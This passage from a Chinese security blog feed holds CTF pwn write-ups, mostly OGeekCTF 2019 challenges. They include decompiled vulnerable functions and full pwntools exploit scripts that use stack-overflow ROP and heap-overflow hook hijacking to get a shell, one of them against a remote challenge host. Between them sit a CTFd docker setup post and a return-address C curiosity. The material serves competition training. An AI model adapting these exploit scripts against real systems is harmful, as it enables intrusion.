class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(data)</span><br><span class="line">main_arean = data<span class="number">-88</span></span><br><span class="line">libc_base = main_arean - <span class="number">0x3c4b20</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">target_addr = data<span class="number">-0x8b</span></span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+<span class="string">"\xe1"</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xd0</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xd0</span>,<span class="string">"\x02"</span>*<span class="number">0x68</span>+p64(<span class="number">0x70</span>)+<span class="string">"\x06"</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xd0</span>,<span class="string">"\x03"</span>*<span class="number">0x68</span>+p64(<span class="number">0x70</span>)+p64(target_addr)+<span class="number">0x58</span>*<span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 8</span></span><br><span class="line"><span class="keyword">print</span> hex(one_gadgets[<span class="number">2</span>]+libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base+libc.symbols[<span class="string">"realloc"</span>]+<span class="number">13</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0xb</span>+p64(one_gadgets[<span class="number">2</span>]+libc_base)+p64(libc_base+libc.symbols[<span class="string">"realloc"</span>]+<span class="number">13</span>)+<span class="string">"a"</span>*(<span class="number">0x50</span><span class="number">-3</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calloc-magic"><a href="#calloc-magic" class="headerlink" title="calloc_magic"></a>calloc_magic</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easypwn&quot;&gt;&lt;a href=&quot;#easypwn&quot; class=&quot;headerlink&quot; title=&quot;easypwn&quot;&gt;&lt;/a&gt;easypwn&lt;/h2&gt;&lt;h3 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTFd 比赛平台的搭建</title>
    <link href="https://nocbtm.github.io/2019/10/14/CTFd-%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2019/10/14/CTFd-比赛平台的搭建/</id>
    <published>2019-10-14T11:40:10.000Z</published>
    <updated>2019-10-14T12:26:11.863Z</updated>
    
    <content type="html"><![CDATA[<p>开源项目地址 <a href="https://github.com/CTFd/CTFd" target="_blank" rel="noopener">https://github.com/CTFd/CTFd</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>建议在docker里面搭建，环境不会冲突。<a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">docker安装教程</a></p><p>安装完docker之后，可用以下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -it ctfd/ctfd</span><br></pre></td></tr></table></figure></p><p>但是安装的太慢，不用官方的镜像，这里建议用阿里云公开的容器镜像，只用如下两条命令即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure></p><p>安装镜像之后起个容器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -it registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在物理机访问 0.0.0.0:8000 即可,第一次登陆设置管理员账号密码，下图是已经设置过的<br><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/20191014200922.png" class="lozad"></p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="重命名镜像"><a href="#重命名镜像" class="headerlink" title="重命名镜像"></a>重命名镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag ctfd:latest registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure><h3 id="查看docker进程"><a href="#查看docker进程" class="headerlink" title="查看docker进程"></a>查看docker进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> ps -a</span><br><span class="line">CONTAINER ID        IMAGE                                              COMMAND                  CREATED             STATUS                      PORTS                                  NAMES</span><br><span class="line">d9f5eefb8d62        pwn_deploy_chroot:latest                           <span class="string">"/service.sh"</span>            6 days ago          Exited (255) 5 days ago     0.0.0.0:10000-10003-&gt;10000-10003/tcp   pwn_deploy_chroot</span><br><span class="line">846ac8b76082        pwn_docker:16.04                                   <span class="string">"/start.sh"</span>              10 days ago         Exited (255) 9 days ago     0.0.0.0:9997-&gt;9999/tcp                 musing_leakey</span><br><span class="line">fd531742a5a3        ctfd:latest                                        <span class="string">"/opt/CTFd/docker-en…"</span>   11 days ago         Up 8 seconds                0.0.0.0:8000-&gt;8000/tcp                 affectionate_khayyam</span><br><span class="line">36aeab92fea7        registry.cn-hangzhou.aliyuncs.com/liujunjie/angr   <span class="string">"/bin/sh -c 'su - an…"</span>   12 days ago         Exited (255) 2 days ago                                            mystifying_ardinghelli</span><br><span class="line">833d79e2e12e        ctf                                                <span class="string">"/bin/sh -c 'exec /b…"</span>   4 months ago        Exited (130) 4 months ago                                          epic_sutherland</span><br><span class="line">a55693666b02        ctf                                                <span class="string">"/bin/sh -c 'exec /b…"</span>   4 months ago        Exited (143) 4 months ago</span><br></pre></td></tr></table></figure><h3 id="停止容器进程"><a href="#停止容器进程" class="headerlink" title="停止容器进程"></a>停止容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop fd53</span><br></pre></td></tr></table></figure><h3 id="启动容器进程"><a href="#启动容器进程" class="headerlink" title="启动容器进程"></a>启动容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start fd53</span><br></pre></td></tr></table></figure><h3 id="重启容器进程"><a href="#重启容器进程" class="headerlink" title="重启容器进程"></a>重启容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart fd53</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开源项目地址 &lt;a href=&quot;https://github.com/CTFd/CTFd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/CTFd/CTFd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安
      
    
    </summary>
    
      <category term="ctf" scheme="https://nocbtm.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://nocbtm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>OGeekCTF 2019 部分 writeups</title>
    <link href="https://nocbtm.github.io/2019/10/11/OGeekCTF-2019-%E9%83%A8%E5%88%86-writeups/"/>
    <id>https://nocbtm.github.io/2019/10/11/OGeekCTF-2019-部分-writeups/</id>
    <published>2019-10-11T08:19:38.000Z</published>
    <updated>2019-10-11T10:36:26.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>靶机环境是32位的glibc-2.23。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">check</span><span class="params">(<span class="keyword">int</span> random)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%ld"</span>, random);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Correct\n"</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序难点在于我们输入的buf要与随机生成的random前v1个字节要相等<br>我们可以直接输入\0开头的字符串来进行绕过，然后strlen的长度就为0，则后面的strncmp判断必定成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">vul</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的漏洞函数中，a1是我们之前输入的第八个字符，如果我们输入\xff时；<br>则在read时a1会进行符号填充，那么我们就可以读入4294967295（-1）个字节，这将直接导致栈溢出，之后就行常规的ROP</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>脚本用了两种不同的ROP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">execve_file = <span class="string">'./babyrop'</span></span><br><span class="line"><span class="comment">#sh = process(execve_file)</span></span><br><span class="line">sh = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">sh.sendline(<span class="string">'\0'</span> + <span class="string">'\xff'</span> * <span class="number">10</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">231</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(<span class="number">0x080487D0</span>)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'puts'</span>])+p32(<span class="number">4</span>))</span><br><span class="line">result=sh.recv(<span class="number">4</span>)</span><br><span class="line">libc.address = u32(result) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc.address))</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">231</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(libc.symbols[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(libc.search(<span class="string">'/bin/sh'</span>).next()))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">sh.send('a' * 231 + p32(0x804b000 - 0x800) + p32(elf.plt['puts']) + p32(0x08048519) + p32(elf.got['puts']) + p32(elf.plt['read']) + p32(0x08048608) + p32(0) + p32(0x804b000 - 0x800) + p32(0x200))</span></span><br><span class="line"><span class="string">result = sh.recvuntil('\n')[:-1]</span></span><br><span class="line"><span class="string">libc_addr = u32(result) - libc.symbols['puts']</span></span><br><span class="line"><span class="string">log.success('libc_addr: ' + hex(libc_addr))</span></span><br><span class="line"><span class="string">sh.send(p32(0) + p32(libc_addr + libc.symbols['system']) + p32(libc_addr + libc.symbols['exit']) + p32(libc_addr + libc.search('/bin/sh').next()))</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>靶机环境是glibc-2.23,<br>在Add_text功能中，size的大小是由用户决定的，而在Update功能中，其输入的大小指定为255，导致堆溢出漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v6 = get_int();</span><br><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">256</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = *(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v4 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L));</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">32</span>) = <span class="built_in">malloc</span>(v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nText:"</span>);</span><br><span class="line">  read_n(&amp;s, <span class="number">0x100</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(*(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v4 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L)) + <span class="number">32L</span>L), &amp;s, v3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nToo many"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nNew Text:"</span>);</span><br><span class="line">read_n(*(<span class="keyword">void</span> **)(*(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v5 + <span class="number">4L</span>L)) + <span class="number">8</span> * (v6 + <span class="number">4L</span>L)) + <span class="number">32L</span>L), <span class="number">255u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nUpdated"</span>, <span class="number">255L</span>L);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>由于Text结构的输入没有null截断，我们可以直接泄露libc地址</li><li>劫持Text结构体，实现任意地址读写，我们只需要提前布置好heap 结构就行</li><li>劫持hook,getshell</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch = 'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="string">'./bookmanager'</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment">#sh = remote('47.112.115.30', 13337)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_chapter</span><span class="params">(c_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Chapter name:'</span>, c_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_section</span><span class="params">(c_name, s_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Which chapter do you want to add into:'</span>, c_name)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_text</span><span class="params">(s_name, size, text)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Which section do you want to add into:'</span>, s_name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'How many chapters you want to write:'</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">'Text:'</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove_text</span><span class="params">(s_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'6'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Book_preview</span><span class="params">()</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(s_name, text)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'8'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'hat to update?(Chapter/Section/Text):'</span>, <span class="string">'Text'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line">    sh.sendafter(<span class="string">'New Text:'</span>, text)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span> * <span class="number">30</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">Add_chapter(<span class="string">'aaaa\n'</span>)</span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'bbbb\n'</span>)</span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'cccc\n'</span>)</span><br><span class="line">Add_text(<span class="string">'bbbb\n'</span>, <span class="number">0x88</span>, <span class="string">'\n'</span>)</span><br><span class="line">Add_text(<span class="string">'cccc\n'</span>, <span class="number">0x68</span>, <span class="string">'here\n'</span>)</span><br><span class="line"></span><br><span class="line">Remove_text(<span class="string">'bbbb\n'</span>)</span><br><span class="line">Add_text(<span class="string">'bbbb\n'</span>, <span class="number">0x88</span>, <span class="string">'\x78'</span>)</span><br><span class="line">Book_preview()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Section:bbbb'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Text:'</span>)</span><br><span class="line"></span><br><span class="line">result = sh.recvline()[:<span class="number">-1</span>]</span><br><span class="line">main_arena_addr = u64(result.ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">'main_arena_addr: '</span> + hex(main_arena_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = main_arena_addr - (libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'dddd\n'</span>)</span><br><span class="line">Update(<span class="string">'cccc\n'</span>, <span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x60</span>, <span class="string">'\0'</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'dddd'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\0'</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">Update(<span class="string">'dddd\n'</span>, p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">Remove_text(<span class="string">'cccc\n'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure><h3 id="hub"><a href="#hub" class="headerlink" title="hub"></a>hub</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;babyrop&quot;&gt;&lt;a href=&quot;#babyrop&quot; class=&quot;headerlink&quot; title=&quot;babyrop
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一段有趣的c语言代码</title>
    <link href="https://nocbtm.github.io/2019/10/10/%E4%B8%80%E6%AE%B5%E6%9C%89%E8%B6%A3%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
    <id>https://nocbtm.github.io/2019/10/10/一段有趣的c语言代码/</id>
    <published>2019-10-10T10:54:55.000Z</published>
    <updated>2019-10-10T12:36:07.158Z</updated>
    
    <content type="html"><![CDATA[<p>今天看到一段有趣的c代码，如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *ret;</span><br><span class="line">ret=&amp;a<span class="number">-1</span>;</span><br><span class="line">(*ret)+=<span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line">x=<span class="number">0</span>;</span><br><span class="line">function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">x=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"x is %d\n"</span>,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>群里的人讨论最终输出x的值是0还是1呐?</p><p>经过我的测试，编译成32位的程序x是0,而64位的是1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc text.c -o text_64</span><br><span class="line">$ gcc text.c -o text_32 -m32</span><br><span class="line">$ ./text_32 </span><br><span class="line">x is 0</span><br><span class="line">$ ./text_64 </span><br><span class="line">x is 1</span><br></pre></td></tr></table></figure></p><p>这是为什么呐?我决定用gdb调一下，先调一下32位的程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 